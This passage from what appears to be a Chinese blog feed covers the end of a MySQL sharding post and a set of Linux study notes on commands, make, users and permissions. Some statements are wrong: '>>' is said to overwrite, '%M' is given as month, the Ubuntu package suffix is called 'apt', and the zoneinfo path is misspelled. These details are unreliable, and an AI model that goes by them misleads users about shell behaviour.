</ol>
<p>数据库分片的两种常见方案：<br>客户端代理： 分片逻辑在应用端，封装在jar包中，通过修改或者封装JDBC层来实现。 当当网的Sharding-JDBC 、阿里的TDDL是两种比较常用的实现。<br>中间件代理： 在应用和数据中间加了一个代理层。分片逻辑统一维护在中间件服务中。我们现在谈的 Mycat 、360的Atlas、网易的DDB等等都是这种架构的实现。</p>
<h3 id="其他优化策略"><a href="#其他优化策略" class="headerlink" title="其他优化策略"></a>其他优化策略</h3><p>MySQL8.0下：</p>
<ol>
<li><p>服务器语句超时处理</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL MAX_EXECUTION_TIME=2000; -- 毫秒为单位</span><br></pre></td></tr></table></figure>

</li>
<li><p>创建全局通用表空间</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create tablespace name add datafile &#x27;filename.ibd&#x27; file_block_size = 16k; --创建名为name的以filename.idb为存储文件的共享表空间</span><br><span class="line">-- 创建表空间后，可以在创建表或修改表时使用tablespace指定表空间</span><br><span class="line">create table test(id int,name varchar(10)) engine=innodb default charset utf8mb4 tablespace name;</span><br><span class="line">-- 或</span><br><span class="line">alter table test tablespace name;</span><br><span class="line">-- 若使用此表空间的表都删除后，即可删除此共享表空间</span><br><span class="line">drop tablespace name;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
<li><p>隐藏索引对调优的帮助</p>
</li>
</ol>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>S-Linux-Note</title>
    <url>/2024/05/05/S-Linux-Note/</url>
    <content><![CDATA[<p>Linux操作系统工作机制，基本命令，常用工具和常见配置。</p>
<span id="more"></span>
<p>[]中的内容均为可省略内容</p>
<h1 id="Linux基础知识"><a href="#Linux基础知识" class="headerlink" title="Linux基础知识"></a>Linux基础知识</h1><h2 id="终端及关机"><a href="#终端及关机" class="headerlink" title="终端及关机"></a>终端及关机</h2><p>打开shell,可见类似如下标识:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@localhost:/root/#</span><br></pre></td></tr></table></figure>
<p>其中</p>
<ul>
<li>root      当前终端登录的用户名；</li>
<li>@         发音at,表示”在”</li>
<li>localhost 当前登录的主机名</li>
<li>&#x2F;root&#x2F;    当前终端工作目录</li>
<li>#        身份识别符，超级管理用户为 #，其他为 $</li>
</ul>
<p><strong>关机</strong><br>Linux中关机命令包括：<code>shutdown -h now</code>,<code>halt</code>,<code>init 0</code>,<br>其中shutdown命令是一个更加灵活的工具，可以用于定时关闭系统或发送警告消息给用户。</p>
<h2 id="文件与文件夹"><a href="#文件与文件夹" class="headerlink" title="文件与文件夹"></a>文件与文件夹</h2><p>Linux中包括进程等均为文件<br><strong>Linux系统文件及其用途</strong></p>
<ul>
<li>Bin 全称binary，二进制，存储二进制文件，可以被运行</li>
<li>Dev 存放外接设备，如其他光盘等，不能直接被使用，必须先挂载</li>
<li>Etc  存储配置文件</li>
<li>Home 除了root用户以外其他所有用户的家目录</li>
<li>Proc process进程，存储linux运行时的进程</li>
<li>Root root用户的家目录</li>
<li>Sbin super binary 存储只有拥有super权限的用户才能执行的二进制文件</li>
<li>Tmp 系统运行时产生的临时文件</li>
<li>Usr 存放用户自己安装的软件，类似windows的program files</li>
<li>var 存储程序&#x2F;系统的日志文件</li>
<li>Mnt 当外接设备需要挂载时就需要挂载在此目录</li>
</ul>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>ctrl+c 强制停止<br>ctrl+d 退出或登出 不能用于退出vi&#x2F;vim<br>history 查看历史命令<br>！+命令前缀 执行上一个匹配此前缀的命令<br>ctrl+r+命令 查找上一个匹配的命令<br>ctrl+a 跳到命令开头<br>ctrl+e 跳到命令结尾<br>ctrl+键盘左键 左跳一个单词<br>ctrl+键盘右键 右跳一个单词<br>ctrl+l 清屏</p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>linux中centos安装包的后缀名是rpm<br>ubuntu安装包的后缀名是apt</p>
<p><strong>centos yum命令</strong></p>
<p>语法：yum [-y] install|remove|search 软件名称<br>注释:需要联网及root权限<br><strong>ubuntu apt命令安装</strong><br>语法：apt [-y] install|remove|search 软件名称</p>
<h2 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h2><p>功能：控制软件(服务)开关<br>语法: systemctl 选项 服务名称<br>选项：</p>
<ul>
<li>start 启动</li>
<li>stop 关闭</li>
<li>status 查看状态</li>
<li>enable 开启开机自启</li>
<li>disable 关闭开机自启<br>没有集成到systemctl的服务可以手动添加</li>
</ul>
<h2 id="日期与时间-date"><a href="#日期与时间-date" class="headerlink" title="日期与时间 date"></a>日期与时间 date</h2><p>1、date命令查看时间<br>语法：date [-d (给定字符串)] [+格式化字符串]<br>选项说明：</p>
<ul>
<li>-d 按照给定字符串显示日期，常用于日期计算，查看后天日期：date -d “+2 day” +%Y%M%d<br>格式化字符串：</li>
</ul>
<ul>
<li>%Y 年</li>
<li>%y 年份后两位数字</li>
<li>%M 月份</li>
<li>%d 日</li>
<li>%H 小时</li>
<li>%M 分钟</li>
<li>%S 秒</li>
<li>%s 自1970-01-01 00:00:00 UTC 到现在的秒数<br>2、修改时区<br>在root权限下，修改&#x2F;etc&#x2F;localtime文件：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f /etc/localtime</span><br><span class="line">sudo ln -s /user/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>
3、时间校准ntp程序<br>安装：<code> yum -y install ntp</code><br>设置开机自启：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start ntpd</span><br><span class="line">systemctl enable ntpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
ntpd启动后会自动联网校准，或手动校准：<br><code>sudo ntpdate -u ntp.aliyun.com</code>使用阿里云服务网站配合Ntpdate自动校准</li>
</ul>
<h2 id="IP地址和主机名"><a href="#IP地址和主机名" class="headerlink" title="IP地址和主机名"></a>IP地址和主机名</h2><p><strong>查看IP: ifconfig</strong><br>若无法使用命令，安装工具：yum -y install net-tools</p>
<p><strong>主机名：</strong><br>命令：hostname<br>修改主机名：sudo hostnamectl set-hostname 主机名</p>
<p><strong>域名解析</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510154730.png"><br>如果想要不通过ip地址访问而是通过主机名访问可以自行配置&#x2F;etc&#x2F;hosts，方法如下：<br>以管理员身份打开上述文件夹，修改hosts文件，按如下格式在文件尾部添加 IP地址+空格+主机名 例如 111.111.111.111 computer</p>
<p>固定IP：略</p>
<h2 id="网络连接与下载ping-wget"><a href="#网络连接与下载ping-wget" class="headerlink" title="网络连接与下载ping wget"></a>网络连接与下载ping wget</h2><p><strong>ping</strong><br>功能：检查指定的网络服务器是否可联通<br>语法：ping [-c num] ip&#x2F;主机名<br>选项：-c 检查次数，不使用此选项将持续检查</p>
<p><strong>wget</strong><br>功能：非交互文件下载工具<br>语法：wget [-b] url<br>选项：-b 后台下载，会将日志写入当前工作目录下的wget-log文件</p>
<p><strong>curl</strong><br>需要先安装curl<br>语法：curl [-O] url<br>选项：-O 用于下载文件，当url是下载链接时</p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p><strong>查看进程</strong><br>语法：ps [-e] [-f]<br>选项：</p>
<ul>
<li>-e显示全部进程</li>
<li>-f以完全格式化形式显示<br>说明：列出的全部信息中，从左到右分别是：</li>
</ul>
<ul>
<li>uid 进程所属用户id</li>
<li>pid 进程id</li>
<li>ppid 父进程id</li>
<li>c 进程cpu占用率</li>
<li>stime 进程启动时间</li>
<li>tty 启动此进程的终端序号，？表示非终端启动</li>
<li>time 进程占用cpu时间</li>
<li>cmd 进程对应名称或启动路径或启动命令<br>可以与grep结合输出特定进程信息：ps -ef | grep tail</li>
</ul>
<p><strong>关闭进程</strong><br>语法：kill [-9] 进程id<br>选项：-9 强制关闭进程，不使用此选项时会向进程发送关闭信号，但是否关闭取决于进程本身处理机制。</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>设备与外界通讯交流的出入口，分为物理端口和虚拟端口，一般指虚拟端口<br>ip地址锁定计算机，端口锁定程序<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510160157.png"></p>
<p><strong>端口查看</strong><br>需要安装nmap，具体见工具中其使用方法</p>
<h2 id="主机状态监控"><a href="#主机状态监控" class="headerlink" title="主机状态监控"></a>主机状态监控</h2><p><strong>top</strong><br>格式: top<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171029.png"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171039.png"><br>top命令选项<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171050.png"><br>top的交互式运行<br><img src="/image.png" alt="alt text"><br>磁盘监控:</p>
<p><strong>iostat</strong><br>查看cpu 磁盘相关信息<br>语法：iostat [-x] [num1] [num2]<br>-x表示显示更多信息，num1为书信间隔，num2为刷新次数<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171325.png"><br><strong>sar网络监控</strong><br>sar命令十分复杂，仅介绍统计网络功能<br>语法：sar -n DEV num1 num2<br>-n 查看网络， DEV表示插卡吗网络接口 num1刷新间隔，不填仅查看一次，num2查看次数，不填默认无限</p>
<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>执行env命令即可查看<br>当执行命令时，依次搜索path中的路径找到对应程序并执行</p>
<p>设置环境变量<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171416.png"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171426.png"><br>永久生效要在对应文件中添加设置变量语句export 变量名&#x3D;变量值</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171437.png"><br>在作上述更改后我们自己编写的程序可以在任何地方直接执行<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510171449.png"></p>
<p>每次打开终端都要source &#x2F;etc&#x2F;profile才能执行改程序，暂不清楚什么原因</p>
<h2 id="linux中上传和下载"><a href="#linux中上传和下载" class="headerlink" title="linux中上传和下载"></a>linux中上传和下载</h2><p>需要finalshall工具</p>
<p><a href="https://www.bilibili.com/video/BV1n84y1i7td?p=41&vd_source=20530c92c1be8bd70e37346e3a5c037a">下载地址</a></p>
<h2 id="压缩和解压（linux常用tar-gzip后缀名）"><a href="#压缩和解压（linux常用tar-gzip后缀名）" class="headerlink" title="压缩和解压（linux常用tar,gzip后缀名）"></a>压缩和解压（linux常用tar,gzip后缀名）</h2><p><strong>tar命令</strong><br>语法：tar [选项] 参数1 参数2 …<br>选项：</p>
<ul>
<li>-c 创建压缩文件</li>
<li>-v 显示解压缩过程，便于查看进度</li>
<li>-x 解压模式</li>
<li>-f 创建或解压的文件，必须放在选项末尾</li>
<li>-z gzip模式，必须放在开头，不使用就是tar模式,</li>
<li>-C 选择解压目的地<br>常用：<br>tar -cvf a.tar 1.txt 2.txt<br>tar -xvf test.tar -C &#x2F;home&#x2F;</li>
</ul>
<p><strong>zip命令</strong><br>语法：zip -r 参数1 参数2<br>-r 被压缩的包含文件夹时，需要此选项</p>
<p><strong>unzip解压</strong><br>语法 unzip [-d] 参数<br>-d 指定解压的位置，同tar的-C<br>同名内容会直接替换</p>
<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h2><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>选项</th>
</tr>
</thead>
<tbody><tr>
<td>pwd</td>
<td>打印当前工作路径</td>
<td></td>
</tr>
<tr>
<td>cd [路径]</td>
<td>切换当前工作目录</td>
<td></td>
</tr>
<tr>
<td>ls [选项] [路径]</td>
<td>列出文件和目录</td>
<td>-l,-la,-lh</td>
</tr>
<tr>
<td>mkdir [选项] 路径1 [路径2]</td>
<td>创建新目录</td>
<td>-p</td>
</tr>
<tr>
<td>touch 路径1 [路径2]</td>
<td>创建新文件</td>
<td></td>
</tr>
<tr>
<td>cp [选项] 原路径 路径</td>
<td>复制并重命名文件或文件夹</td>
<td>-r</td>
</tr>
<tr>
<td>more 路径</td>
<td>查看文件内容</td>
<td></td>
</tr>
<tr>
<td>mv 原路径 路径</td>
<td>移动&#x2F;重命名文件&#x2F;文件夹</td>
<td></td>
</tr>
<tr>
<td>rm [选项] 路径</td>
<td>删除文件&#x2F;文件夹</td>
<td>-r</td>
</tr>
<tr>
<td>cat 路径</td>
<td>查看&#x2F;合并文件</td>
<td></td>
</tr>
<tr>
<td>df</td>
<td>查看磁盘空间</td>
<td>-h</td>
</tr>
<tr>
<td>free</td>
<td>查看内存使用情况</td>
<td>-m,-g,-k</td>
</tr>
<tr>
<td>find</td>
<td>查找文件</td>
<td>-name</td>
</tr>
<tr>
<td>which</td>
<td>定位执行过的命令操作的文件</td>
<td></td>
</tr>
<tr>
<td>echo</td>
<td>输出</td>
<td></td>
</tr>
<tr>
<td>chmod</td>
<td>修改文件&#x2F;文件夹权限</td>
<td></td>
</tr>
<tr>
<td>ln -s 路径 目的路径</td>
<td>创建软链接(快捷方式)</td>
<td></td>
</tr>
</tbody></table>
<h2 id="部分基础命令详解"><a href="#部分基础命令详解" class="headerlink" title="部分基础命令详解"></a>部分基础命令详解</h2><h3 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h3><p>ubuntu:uname -r</p>
<h3 id="Ls"><a href="#Ls" class="headerlink" title="Ls"></a>Ls</h3><p>语法：ls [选项] [路径]<br>功能：列出所有文件和文件目录<br>选项：</p>
<ul>
<li>-l 以详细列表的形式展示</li>
<li>-la 显示所有文件&#x2F;文件夹，包含隐藏文件&#x2F;文件夹</li>
<li>-lh 以列表形式并在显示文件大小时以高可读性的形式展示</li>
</ul>
<p>注释：列出结果中，蓝色为文件夹，黑色为文件，绿色表示拥有所有权限。隐藏文件一般以”.”开头</p>
<h3 id="Mkdir"><a href="#Mkdir" class="headerlink" title="Mkdir"></a>Mkdir</h3><p>语法：mkdir [选项] 路径1 [路径2] [路径3]<br>功能：创建新目录<br>选项：</p>
<ul>
<li>-p 一次创建多层不存在的目录<br>注释：可以一次创建多个目录，touch创建多个文件同此相似</li>
</ul>
<h3 id="Cp"><a href="#Cp" class="headerlink" title="Cp"></a>Cp</h3><p>语法：cp [选项] 原路径 路径<br>功能：复制文件或文件夹到指定位置同时可以重命名<br>选项：</p>
<ul>
<li>-r 递归复制，在复制文件夹时必须使用此选项<br>注释：复制时可同时重命名</li>
</ul>
<h3 id="Rm"><a href="#Rm" class="headerlink" title="Rm"></a>Rm</h3><p>功能：删除文件&#x2F;文件夹<br>语法：rm [选项] 路径<br>选项：</p>
<ul>
<li>-r 递归删除，删除文件夹及其中文件</li>
<li>-f 强制删除<br>注释：* 通配符，如a.txt,b.txt可表示为*.txt</li>
</ul>
<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向 &gt;,&gt;&gt;"></a>输出重定向 &gt;,&gt;&gt;</h3><p>语法：正常执行的指令 &gt;&#x2F;&gt;&gt; 文件的路径<br>注释：可以将命令的执行结果保存到文件中，或是输出一些数据到文件中。<br>示例: ls -la &gt; ls.txt</p>
<h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>功能：查看&#x2F;合并文件<br>语法：</p>
<ol>
<li>cat 路径</li>
<li>cat 待合并文件路径1 待合并文件路径2 … &gt; 合并之后的文件路径<br>注释：<br>合成后的文件必须不是需要合并的文件名</li>
</ol>
<h3 id="查找-find"><a href="#查找-find" class="headerlink" title="查找 find"></a>查找 find</h3><p>语法：find 起始路径 -name “被查找文件名”</p>
<h3 id="管道符-、grep、wc"><a href="#管道符-、grep、wc" class="headerlink" title="管道符 |、grep、wc"></a>管道符 |、grep、wc</h3><p><strong>grep</strong><br>语法：grep [-n] 关键字 文件路径<br>功能：通过关键字过滤文件行<br>选项：</p>
<ul>
<li>-n 在结果中显示匹配行的行号<br>注释：会输出对应行，文件路径要精确到文件名</li>
</ul>
<p><strong>wc</strong><br>语法：wc [-c -m -l -w] 文件路径<br>功能：统计文件行数单词数量等<br>选项：</p>
<ul>
<li>-c 统计bytes的数量</li>
<li>-m 统计字符数量</li>
<li>-l 统计行数</li>
<li>-w 统计单词数量<br>注释：不带选项会输出 行数 单词数 字节数</li>
</ul>
<p><strong>管道符|</strong><br>语法：示例： cat text.txt | grep a<br>功能：将管道符左边命令的结果作为右边命令的输入<br>注释：左边的命令必须要有输出，右边必须要有输入</p>
<h3 id="echo、反引号、tail、重定向符"><a href="#echo、反引号、tail、重定向符" class="headerlink" title="echo、反引号、tail、重定向符"></a>echo、反引号、tail、重定向符</h3><p><strong>echo</strong><br>语法：echo 输出的内容<br>功能：在命令行内输出指定内容<br>注释：内容如果带有空格或\等特殊符号，需要用双引号包裹</p>
<p>**反引号`**<br>语法：`命令`<br>功能：将其内的内容作为命令执行而非普通字符</p>
<p><strong>重定向符</strong> &gt; &gt;&gt;<br>语法：echo “test” &gt; test.txt、ls &gt; test.txt两种<br>功能：<br>&gt; 将左侧命令的结果覆盖写入符号右侧指定的文件中<br>&gt;&gt; 将左侧命令的结果覆盖写入符号右侧指定的文件中</p>
<p><strong>tail</strong><br>语法：tail [-f&#x2F;-num] 路径<br>功能：查看文件尾部内容，跟踪文件的最新更改<br>选项:</p>
<ul>
<li>-f 表示持续跟踪</li>
<li>-num 查看尾部n行，无此默认10行</li>
</ul>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="vi-vim-文本编辑器"><a href="#vi-vim-文本编辑器" class="headerlink" title="vi vim 文本编辑器"></a>vi vim 文本编辑器</h2><p>安装：<br>ubuntu: sudo apt-get install vim<br>语法：vim 文件路径<br>功能：打开一个文件(不存在则创建)<br>使用：<br>开始时进入命令模式</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>在当前光标位置进入输入模式</td>
</tr>
<tr>
<td>a</td>
<td>在当前光标位置进入输入模式</td>
</tr>
<tr>
<td>I</td>
<td>在当前行的开头进入输入模式</td>
</tr>
<tr>
<td>A</td>
<td>在当前行的结尾进入输入模式</td>
</tr>
<tr>
<td>o</td>
<td>在当前光标下一行进入输入模式</td>
</tr>
<tr>
<td>O</td>
<td>在当前光标上一行进入输入模式</td>
</tr>
<tr>
<td>esc</td>
<td>任何情况下输入esc回到命令模式</td>
</tr>
<tr>
<td>键盘上;k</td>
<td>向上移动光标</td>
</tr>
<tr>
<td>键盘下;j</td>
<td>向下移动光标</td>
</tr>
<tr>
<td>键盘左;h</td>
<td>向左移动光标</td>
</tr>
<tr>
<td>键盘右;l</td>
<td>向右移动光标</td>
</tr>
<tr>
<td>0</td>
<td>移动光标到当前行开头</td>
</tr>
<tr>
<td>$</td>
<td>移动光标到当前行结尾</td>
</tr>
<tr>
<td>PgUp</td>
<td>向上翻页</td>
</tr>
<tr>
<td>PgDn</td>
<td>向下翻页</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>进入搜索模式</td>
</tr>
<tr>
<td>n</td>
<td>向下继续搜索</td>
</tr>
<tr>
<td>N</td>
<td>向上继续搜索</td>
</tr>
<tr>
<td>底线命令模式：</td>
<td></td>
</tr>
<tr>
<td>命令</td>
<td>描述</td>
</tr>
<tr>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td>:wq</td>
<td>保存退出</td>
</tr>
<tr>
<td>:q</td>
<td>不保存退出</td>
</tr>
<tr>
<td>:q!</td>
<td>强制退出</td>
</tr>
<tr>
<td>:w</td>
<td>仅保存</td>
</tr>
<tr>
<td>:set nu</td>
<td>显示行号</td>
</tr>
<tr>
<td>:set paste</td>
<td>设置粘贴模式</td>
</tr>
</tbody></table>
<h2 id="Make和makefile"><a href="#Make和makefile" class="headerlink" title="Make和makefile"></a>Make和makefile</h2><p><a href="https://www.gnu.org/software/make/manual/html_node/Rules.html">官方手册</a></p>
<p>Makefile 中写的仍然是命令，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标文件：依赖文件  </span><br><span class="line">\&lt; TAB\&gt;编译命令 </span><br></pre></td></tr></table></figure>

<p>依赖文件即源文件,目标文件也可以是目标，依赖文件必须在本目录下，所以如下格式：</p>
<p><code>Clean:</code></p>
<p>它的编译命令必须是 make clean 如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean</span><br></pre></td></tr></table></figure>
<p>当本目录下有一个名为clean的文件时，将无法执行，需要在上一行加上.PHONY:避免重名冲突变量设置同在shell中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">定义： OBJ = add</span><br><span class="line">取值： \$(OBJ)</span><br></pre></td></tr></table></figure>
<p>预定义变量</p>
<ul>
<li>AR 库文件维护程序名称，默认为ar</li>
<li>AS 汇编程序名称，默认为as</li>
<li>CC C编译器名称 默认为cc</li>
<li>CPP C预编译器名称，默认为$(CC) -E</li>
<li>CXX C++编译器名称，默认为g++</li>
<li>FC FORTRAN编译器名称，默认为f77</li>
<li>RM 文件删除程序名称，默认为rm -f<br>直接调用CC这个变量:<code>$(CC) add.o -o add</code><br><code>![](https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240509220940.png &quot;自动变量&quot;)</code></li>
</ul>
<p><strong>反斜杠（\）</strong>是换行符make看到一个[.o]文件，它就会自动的把[.c]文件加在依赖关系中，如果make找到一个whatever.o，那么whatever.c，就会是whatever.o的依赖文件，由此可以只写.h依赖文件（.c和.o同名）<br>+&#x3D;是追加</p>
<p><a href="https://blog.csdn.net/darmao/article/details/81077055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169954666316800186516976%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169954666316800186516976&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-81077055-null-null.142%5Ev96%5Epc_search_result_base2&utm_term=makefile%E7%BC%96%E5%86%99%E8%A7%84%E5%88%99&spm=1018.2226.3001.4187">参考文档</a></p>
<p><code>![](https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240509220859.png)</code><br>综述：</p>
<p>1、规则格式： 目标文件: 依赖文件1 依赖文件2<br>2、命令格式： TAB 命令 （命令必须以Tab键开始！！！）<br>3、以#开头为注释，会被忽略；\是换行符，便于观察，视为同一行；@符标识的命令不会打印但仍会执行；-标识需要忽略错误的命令，即被标识的命令即使错误执行也不会退出而是继续执行其他指令；<br>4、make 可以自己判断依赖，每个规则在满足依赖文件的前提下执行命令，一个规则下可有多条命令。可以一个Makefile的规则一起make，也可以通过make 规则目标文件来开始特定规则。<br>5、特殊的clean规则，执行时必须使用make clean命令，因为它没有依赖文件<br>6、标识符.PHONY: 当有一个文件名为clean时，makeclean无法执行上一条规则，可以使用此标识符，clean将不在被视为文件而是伪目标，install也常被表示为伪目标<br>7、make针对每条命令，都会创建一个独立的Shell环境，类似cd ..这样的命令，并不会影响当前目录，但当将它们以;分隔而不是换行，即可实现。<br>8、隐式规则：当遇到一个xyz.o时，没有找到对应规则，自动应用：<br>9、变量定义：变量名&#x3D;值 或 变量名 :&#x3D;值<br>变量引用：$(变量名)<br>10、自动生成依赖列表（针对c编译）<br>11、可以用$(CC)代替CC，它是make内置变量，可以修改默认值指向gcc<br>12、$@、$&lt;、$^自动变量，前者标识目标文件,中间表示第一个依赖项，后者表示所有依赖文件，有歧义时必须使用 ()<br>13、模式规则，自动按需要匹配，匹配则创建规则<br>14、-MM参数，gcc参数，解决.h文件更新而不会重新编译的问题</p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240509222945.png">&#96;</p>
<h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240509223023.png">&#96;</p>
<h1 id="用户与权限"><a href="#用户与权限" class="headerlink" title="用户与权限"></a>用户与权限</h1><h2 id="root用户和普通用户"><a href="#root用户和普通用户" class="headerlink" title="root用户和普通用户"></a>root用户和普通用户</h2><p>root拥有最大的系统操作权限，普通用户一般只在HOME目录下是不受限的，其他目录只有只读和执行的权限</p>
<h2 id="su-sudo"><a href="#su-sudo" class="headerlink" title="su sudo"></a>su sudo</h2><p><strong>su</strong><br>语法：su [-] 用户名<br>功能：切换用户<br>注释：-符号可选，表示是否在切换后加载环境变量，建议带上,省略用户名时切换到root。</p>
<p><strong>sudo</strong><br>语法：sudo 其他命令<br>功能：为普通用户配置sudo认证<br>注释：<br>修改密码：<br>sudo passwd 用户名</p>
<h2 id="更改用户名"><a href="#更改用户名" class="headerlink" title="更改用户名"></a>更改用户名</h2><p>需要在root用户下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /home/原用户 /home/新用户名</span><br><span class="line">sed -i &#x27;s/原用户名/新用户名/g&#x27; /etc/shadow</span><br><span class="line">sed -i &#x27;s/原用户名/新用户名/g&#x27; /etc/passwd</span><br><span class="line">sed -i &#x27;s/原用户名/新用户名/g&#x27; /etc/group</span><br></pre></td></tr></table></figure>

<h2 id="用户与用户组管理"><a href="#用户与用户组管理" class="headerlink" title="用户与用户组管理"></a>用户与用户组管理</h2><p>1、用户组的创建和删除（必须在root下执行）<br>创建：groupadd 用户组名<br>删除：groupdel 用户组名<br>修改：groupmod 选项 用户组名<br>选项：</p>
<ul>
<li>-g gid，为用户组指定新的组标识号</li>
<li>-n 新用户组，将用户组的名字改为新名字，修改用户组的名称和gid</li>
</ul>
<p>添加删除成员：gpasswd [选项][用户][组]</p>
<ul>
<li>-r 删除组密码</li>
<li>-a——把用户加入组</li>
<li>-d——把用户从组中删除。</li>
<li>-M——可同时添加多个用户</li>
<li>-A——给组指派管理员。</li>
</ul>
<p>查询用户和组信息：<br>查询用户信息：id 用户名<br>查询用户所属组信息：groups 用户名</p>
<p>2、用户的创建，删除和查看、修改</p>
<p>创建：useradd [-g-d] 用户名<br>注： -d 指定用户home路径，不指定默认&#x2F;home&#x2F;用户名；<br>-g 指定用户所在的组 不指定创建同名组并自动加入，指定-g需要组已经存在</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510165923.png"><br>删除：userdel [-r] 用户名 注：有-r删除用户的home目录，没有就保留<br>查看：id [用户名] 注：没有用户名就查看自身<br>修改用户所在组：usermod -aG 用户组 用户名</p>
<p>3、查看当前系统有哪些用户</p>
<p>getent passwd 不需要root也能执行<br>getent groop 查看系统全部组信息<br>4、groupmems</p>
<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>ls -l查看<br>r:读权限<br>w:写权限<br>x:执行权限<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510170120.png"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510170133.png"><br>s权限：以属主权限执行而非以执行者权限执行</p>
<h2 id="修改权限和所属关系"><a href="#修改权限和所属关系" class="headerlink" title="修改权限和所属关系"></a>修改权限和所属关系</h2><p><strong>chmod</strong><br>语法：chmod [-R ] 权限 文件或文件夹<br>功能：修改文件，文件夹的权限信息<br>注释：只有在root用户或所属用户才能修改<br>权限可用三位数字表示，第一位表示用户权限，第二位表示用户组权限，第三位表示其他用户权限，数字表示中，r记为4，w记为2，x记为1，拥有多个权限即数字和，如5为rx,6为rw。</p>
<p><strong>chown</strong><br>修改文件，文件夹所属用户和用户组<br>语法：chown [-R] [用户][:][用户组] 文件&#x2F;文件夹<br>注释：只有在root用户或所属用户才能修改<br>示例 chown root a.txt将a.txt所属用户改为root</p>
<h2 id="umask命令"><a href="#umask命令" class="headerlink" title="umask命令"></a>umask命令</h2><p>umask 是一个用于设置文件创建时默认权限掩码的命令。在 Linux&#x2F;Unix 系统中，文件和目录有默认的权限值，然后umask 通过减去权限来影响这些默认值。<br>查看当前 umask 设置： umask<br>设置新的 umask: umask <strong>掩码</strong><br>umask使用八进制数表示的掩码来指定要从默认权限中移除的权限。常见的权限值包括：</p>
<p><strong>4</strong>：读权限<br><strong>2</strong>：写权限<br><strong>1</strong>：执行权限</p>
<p>例如，如果当前 umask 是022，那么新创建的文件默认权限会减去,W（写权限）给组和其他用户。<br>请注意，umask不会影响已经存在的文件或目录的权限，它只会影响新创建的文件或目录的默认权限。</p>
<h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><h2 id="网站与服务器"><a href="#网站与服务器" class="headerlink" title="网站与服务器"></a>网站与服务器</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240510165141.png"></p>
<h2 id="VMware使用"><a href="#VMware使用" class="headerlink" title="VMware使用"></a>VMware使用</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>克隆后的信息同原来的完全相同</p>
